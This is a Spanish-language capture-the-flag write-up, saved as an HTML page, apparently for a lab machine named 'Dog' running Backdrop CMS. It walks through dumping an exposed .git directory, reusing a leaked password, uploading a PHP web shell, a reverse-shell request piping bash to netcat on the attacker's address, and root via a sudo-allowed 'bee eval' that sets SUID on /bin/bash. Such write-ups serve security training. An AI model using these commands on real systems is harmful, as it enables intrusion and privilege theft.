@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./agile.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Agile</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
+<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
+|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
+|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 22 disallowed entries (15 shown)
+| /core/ /profiles/ /README.md /web.config /admin 
+| /comment/reply /filter/tips /node/add /search /user/register 
+|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
+| http-git: 
+|   10.10.11.58:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
+|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
+|_http-title: Home | Dog
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="2-enumeración-e-intrusión-web">2. Enumeración e intrusión web</h2>
+<p>Podemos observar que el propio nmap nos indica que existe un directorio .git, el cual lo podemos descargar con la herramienta <code>git-hack</code>:</p>
+<pre><code class="language-bash"># python3 git-hack http://10.10.11.58/.git
+</code></pre>
+<p>En el podemos ver que existe un archivo llamado <code>settings.php</code> en el que podemos encontrar lo siguiente:</p>
+<pre><code class="language-bash">$database = &#39;mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop&#39;;
+$database_prefix = &#39;&#39;;
+</code></pre>
+<p>Tenemos entonces una posible contraseña, pero nos falta un usuario. Si buscamos por la cadena dog.htb en todo el directorio .git, descubrimos lo siguiente:</p>
+<pre><code class="language-bash"># grep -r &quot;dog.htb&quot;  
+    files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: &quot;tiffany@dog.htb&quot;
+</code></pre>
+<p>Por lo que tenemos unos posibles credenciales <code>tiffany:BackDropJ2024DS2024</code>. Probamos a loguearnos a través del servicio SSH, pero vemos que no somos capaces de realizarlo. En la página web, existe un formulario de inicio de sesión, y ahí si que somos capaces de acceder.</p>
+<p>&nbsp;</p>
+<h2 id="3-acceso-a-la-máquina">3. Acceso a la máquina</h2>
+<p>Si con <strong>wapplyzer</strong> listamos las tecnologías de la web, observamos que utiliza el CMS <strong>Backdrop</strong>. Podemos entonces buscar por exploits que efecten a dicho servicio, y encontramos el siguiente: <a href="https://www.exploit-db.com/exploits/52021">https://www.exploit-db.com/exploits/52021</a>, el cual crea una shell php en un endpoint de la aplicación.</p>
+<p>Si lo ejecutamos genererá un archivo .zip que tendremos que subir al endpoint <code>http://10.10.11.58/?q=admin/installer/manual</code>. Pero vemos que en el formulario de subida del archivo solo permite archivos tar.gz, por lo que descomprimimos el .zip y lo comprimimos de nuevo en el nuevo formato:</p>
+<pre><code class="language-bash"># tar -czvf shell.tar.gz shell
+</code></pre>
+<p>Una vez subido, vemos que tendremos una shell en php en el endpoint <a href="http://10.10.11.58//modules/shell/shell.php?cmd=">http://10.10.11.58//modules/shell/shell.php?cmd=</a>. Por lo que podemos hacer una revershell a nuestra máquina:</p>
+<pre><code class="language-bash"># nc -lvnp 4444
+</code></pre>
+<p>Y realizando la petición:</p>
+<pre><code>http://10.10.11.58//modules/shell/shell.php?cmd=/bin/bash -i 2&gt;&amp;1|nc 10.10.15.100 4444
+</code></pre>
+<p>Accedemos entonces como usuario www-data a la máquina.</p>
+<p>&nbsp;</p>
+<h2 id="4-movimiento-lateral">4. Movimiento lateral</h2>
+<p>Vemos que existe el usuario johncusack y que si probamos con la contraseña, listada en el paso 2: <code>BackDropJ2024DS2024</code> damos accedido. Conseguimos entonces la flag de usuario.</p>
+<p>&nbsp;</p>
+<h2 id="5-escalado-de-privilegios">5. Escalado de privilegios</h2>
+<p>Si hacemos <code>sudo -l</code> vemos los siguiente:</p>
+<pre><code class="language-bash">Matching Defaults entries for johncusack on dog:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee
+</code></pre>
+<p>Si observamos dicho ejecutable, vemos lo siguiente:</p>
+<pre><code class="language-bash">#!/usr/bin/env php
+&lt;?php
+/**
+* @file
+* A command line utility for Backdrop CMS.
+*/
+
+// Exit gracefully with a meaningful message if installed within a web
+// accessible location and accessed in the browser.
+if (!bee_is_cli()) {
+echo bee_browser_load_html();
+die();
+}
+
+// Set custom error handler.
+set_error_handler(&#39;bee_error_handler&#39;);
+
+// Include files.
+require_once __DIR__ . &#39;/includes/miscellaneous.inc&#39;;
+require_once __DIR__ . &#39;/includes/command.inc&#39;;
+require_once __DIR__ . &#39;/includes/render.inc&#39;;
+require_once __DIR__ . &#39;/includes/filesystem.inc&#39;;
+require_once __DIR__ . &#39;/includes/input.inc&#39;;
+require_once __DIR__ . &#39;/includes/globals.inc&#39;;
+
+// Main execution code.
+bee_initialize_server();
+bee_parse_input();
+bee_initialize_console();
+bee_process_command();
+bee_print_messages();
+bee_display_output();
+exit();
+
+/**
+* Custom error handler for `bee`.
+*
+* @param int $error_level
+*   The level of the error.
+* @param string $message
+*   Error message to output to the user.
+* @param string $filename
+*   The file that the error came from.
+* @param int $line
+*   The line number the error came from.
+* @param array $context
+*   An array of all variables from where the error was triggered.
+*
+* @see https://www.php.net/manual/en/function.set-error-handler.php
+* @see _backdrop_error_handler()
+*/
+function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {
+require_once __DIR__ . &#39;/includes/errors.inc&#39;;
+_bee_error_handler_real($error_level, $message, $filename, $line, $context);
+}
+
+/**
+* Detects whether the current script is running in a command-line environment.
+*/
+function bee_is_cli() {
+return (empty($_SERVER[&#39;SERVER_SOFTWARE&#39;]) &amp;&amp; (php_sapi_name() == &#39;cli&#39; || (is_numeric($_SERVER[&#39;argc&#39;]) &amp;&amp; $_SERVER[&#39;argc&#39;] &gt; 0)));
+}
+
+/**
+* Return the HTML to display if this page is loaded in the browser.
+*
+* @return string
+*   The concatentated html to display.
+*/
+function bee_browser_load_html() {
+// Set the title to use in h1 and title elements.
+$title = &quot;Bee Gone!&quot;;
+// Place a white block over &quot;#!/usr/bin/env php&quot; as this is output before
+// anything else.
+$browser_output = &quot;&lt;div style=&#39;background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;&#39;&gt;&amp;nbsp;&lt;/div&gt;&quot;;
+// Add the bee logo and style appropriately.
+$browser_output .= &quot;&lt;img src=&#39;./images/bee.png&#39; align=&#39;right&#39; width=&#39;150&#39; height=&#39;157&#39; style=&#39;max-width:100%;margin-top:3rem;&#39;&gt;&quot;;
+// Add meaningful text.
+$browser_output .= &quot;&lt;h1 style=&#39;font-family:Tahoma;&#39;&gt;$title&lt;/h1&gt;&quot;;
+$browser_output .= &quot;&lt;p style=&#39;font-family:Verdana;&#39;&gt;Bee is a command line tool only and will not work in the browser.&lt;/p&gt;&quot;;
+// Add the document title using javascript when the window loads.
+$browser_output .= &quot;&lt;script&gt;window.onload = function(){document.title=&#39;$title&#39;;}&lt;/script&gt;&quot;;
+// Output the combined string.
+return $browser_output;
+}
+</code></pre>
+<p>Podemos entonces ejecutar lo siguiente, para otorgar permisos suids al ejecutable /bin/bash.</p>
+<pre><code class="language-bash"># sudo /usr/local/bin/bee --root=/var/www/html eval &#39;exec(&quot;chmod +s /bin/bash&quot;);&#39;
+</code></pre>
+<p>Para obtener una bash como root, simplemente tenemos que ejecutar <code># /bin/bash -p</code>, y vemos que somos capaces de obtener la flag de root.</p>
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
